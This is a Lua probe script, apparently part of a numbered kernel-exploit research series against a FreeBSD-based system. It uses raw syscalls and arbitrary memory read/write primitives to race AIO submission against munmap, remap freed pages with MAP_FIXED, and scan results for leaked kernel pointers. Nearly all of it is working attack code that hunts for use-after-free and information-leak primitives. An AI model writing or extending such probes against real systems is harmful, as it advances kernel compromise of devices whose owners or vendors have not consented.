-- CRASH_CLASS: MODERATE
-- PROBE 353d: AIO result-pointer unmap race
--
-- 353c confirmed: AIO cancel/delete are safe — operations complete
-- synchronously so no race window exists.
--
-- New angle: what if we unmap (munmap) the result buffer or the
-- request array WHILE AIO is in flight? The kernel copies results
-- back to userland via copyout(). If the page is unmapped between
-- submit and completion, copyout() hits a fault.
--
-- On FreeBSD, copyout() to an unmapped page returns EFAULT but
-- the kernel object (aiocb, file ref) may already be consumed.
-- If the error path doesn't clean up properly → leak or corruption.
--
-- Also test: unmap the REQUEST array itself after submit. The kernel
-- may re-read fields from it during completion.
--
-- Strategy:
-- 1. mmap a page, put AIO request struct there, submit
-- 2. Immediately munmap that page
-- 3. Check if completion writes to freed memory or crashes
-- 4. Same with result buffer: allocate result buf on a separate
--    mmap page, submit AIO pointing there, munmap result page

print("=== PROBE 353d: AIO UNMAP RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sc_mmap   = mk(477)
local sc_munmap = mk(73)
local sc_open   = mk(5)
local sc_close  = mk(6)
local sc_aio    = mk(669)  -- aio_submit_cmd
local sc_poll   = mk(664)  -- aio_multi_poll
local sc_del    = mk(662)  -- aio_multi_delete

local PAGE = 0x4000  -- 16KB

-- Open /dev/zero for read AIO
local path_buf = memory.alloc(16)
for i = 1, 9 do wd(N(path_buf) + i - 1, string.byte("/dev/zero", i)) end
wd(N(path_buf) + 9, 0)
local fd_ret = nil
pcall(function() fd_ret = sc_open(path_buf, uint64(0), uint64(0)) end)
local zero_fd = fd_ret and N(fd_ret) or -1
print("zero_fd=" .. zero_fd)
if zero_fd < 0 or zero_fd > 0x10000 then
    print("ABORT: can't open /dev/zero")
    return
end

-- Stable buffers for polling/ids
local poll_buf = memory.alloc(0x100)
local id_buf   = memory.alloc(0x100)

local function check_kptr(addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR %s+0x%X: %s ***", label, off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

local total_kptr = 0

-- ============ TEST A: Unmap RESULT buffer after submit ============
print("")
print("[A] Unmap result buffer after AIO submit")

for round = 1, 5 do
    if not alive() then print("  DEAD at R" .. round); break end

    -- mmap a page for result data
    local res_page = nil
    pcall(function()
        res_page = sc_mmap(uint64(0), uint64(PAGE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not res_page or N(res_page) == 0 then
        print("  R" .. round .. ": mmap failed"); break
    end
    local rp = N(res_page)

    -- Fill result page with sentinel
    for off = 0, 0x3F, 4 do wd(rp + off, 0xAAAAAAAA) end

    -- Build AIO request in stable memory
    local req = memory.alloc(0x30)
    for off = 0, 0x2C, 4 do wd(N(req) + off, 0) end

    -- aiocb: fd at +0x00, buf at +0x08, nbytes at +0x10, offset at +0x18
    wd(N(req), zero_fd)           -- fd
    wq(N(req) + 0x08, res_page)   -- buf → the page we'll unmap
    wq(N(req) + 0x10, uint64(16)) -- nbytes
    wq(N(req) + 0x18, uint64(0))  -- offset

    -- Submit: cmd=1 (read)
    wq(N(id_buf), uint64(0))
    local sret = nil
    pcall(function()
        sret = sc_aio(uint64(1), req, uint64(1), uint64(1), id_buf)
    end)
    local aio_id = rd(N(id_buf)) or 0

    -- IMMEDIATELY unmap the result page
    local mret = nil
    pcall(function()
        mret = sc_munmap(res_page, uint64(PAGE))
    end)
    local munmap_ok = mret and N(mret) == 0

    -- Poll for completion
    for off = 0, 0x1F, 4 do wd(N(poll_buf) + off, 0) end
    wd(N(poll_buf), aio_id)
    local pret = nil
    pcall(function()
        pret = sc_poll(poll_buf, uint64(1), uint64(0))
    end)
    local poll_state = rd(N(poll_buf) + 4) or -1

    -- Try to read the unmapped page (should fault if truly unmapped)
    local read_ok = false
    local read_val = nil
    pcall(function()
        read_val = memory.read_dword(rp)
        read_ok = true
    end)

    print(string.format("  R%d: addr=%s submit=%s id=0x%X munmap=%s poll_st=0x%X read_ok=%s read_val=0x%X",
        round, fmt(res_page), fmt(sret), aio_id, tostring(munmap_ok), poll_state,
        tostring(read_ok), read_val and N(read_val) or 0))

    if not alive() then print("  DEAD after R" .. round); break end
end

-- ============ TEST B: Unmap REQUEST array after submit ============
print("")
print("[B] Unmap request array after AIO submit")

for round = 1, 5 do
    if not alive() then print("  DEAD at R" .. round); break end

    -- mmap a page for the request struct
    local req_page = nil
    pcall(function()
        req_page = sc_mmap(uint64(0), uint64(PAGE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not req_page or N(req_page) == 0 then
        print("  R" .. round .. ": mmap failed"); break
    end
    local rqp = N(req_page)

    -- Result buffer in stable memory
    local res_buf = memory.alloc(0x40)
    for off = 0, 0x3C, 4 do wd(N(res_buf) + off, 0xBBBBBBBB) end

    -- Build request in the mmap page
    for off = 0, 0x2C, 4 do wd(rqp + off, 0) end
    wd(rqp, zero_fd)
    wq(rqp + 0x08, uint64(string.format("0x%X", N(res_buf))))
    wq(rqp + 0x10, uint64(16))
    wq(rqp + 0x18, uint64(0))

    -- Submit
    wq(N(id_buf), uint64(0))
    local sret = nil
    pcall(function()
        sret = sc_aio(uint64(1), req_page, uint64(1), uint64(1), id_buf)
    end)
    local aio_id = rd(N(id_buf)) or 0

    -- IMMEDIATELY unmap the request page
    local mret = nil
    pcall(function()
        mret = sc_munmap(req_page, uint64(PAGE))
    end)
    local munmap_ok = mret and N(mret) == 0

    -- Poll
    for off = 0, 0x1F, 4 do wd(N(poll_buf) + off, 0) end
    wd(N(poll_buf), aio_id)
    local pret = nil
    pcall(function()
        pret = sc_poll(poll_buf, uint64(1), uint64(0))
    end)
    local poll_state = rd(N(poll_buf) + 4) or -1

    -- Check result buf
    local res_val = rd(N(res_buf)) or 0

    print(string.format("  R%d: submit=%s id=0x%X munmap=%s poll_st=0x%X res=0x%08X",
        round, fmt(sret), aio_id, tostring(munmap_ok), poll_state, res_val))

    -- Scan result area for kptrs
    local kp = check_kptr(N(res_buf), 0x40, "res_buf")
    total_kptr = total_kptr + kp

    if not alive() then print("  DEAD after R" .. round); break end
end

-- ============ TEST C: Remap after unmap (reclaim page) ============
print("")
print("[C] Unmap result page, remap at same addr, check AIO write target")

for round = 1, 3 do
    if not alive() then print("  DEAD at R" .. round); break end

    -- mmap result page
    local res_page = nil
    pcall(function()
        res_page = sc_mmap(uint64(0), uint64(PAGE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local rp = res_page and N(res_page) or 0
    if rp == 0 then print("  R" .. round .. ": mmap failed"); break end

    for off = 0, 0x3F, 4 do wd(rp + off, 0xDEADDEAD) end

    -- Build request
    local req = memory.alloc(0x30)
    for off = 0, 0x2C, 4 do wd(N(req) + off, 0) end
    wd(N(req), zero_fd)
    wq(N(req) + 0x08, res_page)
    wq(N(req) + 0x10, uint64(64))
    wq(N(req) + 0x18, uint64(0))

    -- Submit
    wq(N(id_buf), uint64(0))
    pcall(function() sc_aio(uint64(1), req, uint64(1), uint64(1), id_buf) end)
    local aio_id = rd(N(id_buf)) or 0

    -- Unmap
    pcall(function() sc_munmap(res_page, uint64(PAGE)) end)

    -- Remap at SAME address (MAP_FIXED)
    local new_page = nil
    pcall(function()
        new_page = sc_mmap(res_page, uint64(PAGE), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
    end)
    local np = new_page and N(new_page) or 0

    -- Fill new page with different sentinel
    if np == rp then
        for off = 0, 0x3F, 4 do wd(np + off, 0xCAFECAFE) end
    end

    -- Poll
    for off = 0, 0x1F, 4 do wd(N(poll_buf) + off, 0) end
    wd(N(poll_buf), aio_id)
    pcall(function() sc_poll(poll_buf, uint64(1), uint64(0)) end)
    local poll_state = rd(N(poll_buf) + 4) or -1

    -- Read new page — did AIO write to the reclaimed page?
    local val0 = rd(rp) or 0
    local val4 = rd(rp + 4) or 0

    local same_addr = (np == rp)
    print(string.format("  R%d: id=0x%X remap=%s same_addr=%s poll=0x%X val0=0x%08X val4=0x%08X",
        round, aio_id, fmt(new_page), tostring(same_addr), poll_state, val0, val4))

    -- If val0 is 0 (from /dev/zero read) instead of 0xCAFECAFE, AIO wrote to reclaimed page!
    if val0 == 0 and same_addr then
        print("  *** AIO WROTE TO RECLAIMED PAGE! ***")
    end

    local kp = check_kptr(rp, 0x40, "reclaimed")
    total_kptr = total_kptr + kp

    -- Cleanup
    pcall(function() sc_munmap(new_page, uint64(PAGE)) end)
end

pcall(function() sc_close(uint64(zero_fd)) end)

print("")
print(string.format("TOTAL kptr=%d", total_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 353d COMPLETE ===")
